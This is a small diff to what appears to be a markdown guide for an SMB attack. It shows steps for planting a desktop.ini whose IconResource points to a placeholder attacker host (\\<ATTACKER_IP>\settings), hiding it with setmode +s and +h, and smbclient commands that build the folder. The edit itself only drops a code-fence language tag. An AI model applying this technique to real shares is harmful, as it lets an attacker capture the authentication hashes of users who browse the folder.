@@ -41,7 +41,7 @@ IconResource=\\<ATTACKER_IP>\settings
 7. make it a system file using `setmode <INI_FILE> +s`
 8. and make it hidden using `setmode <INI_FILE> +h`
 9. *overall,* it should like this:
-```shell
+```
 smb: \> mkdir <FOLDER>
 smb: \> setmode <FOLDER> +s
 smb: \> cd <FOLDER>
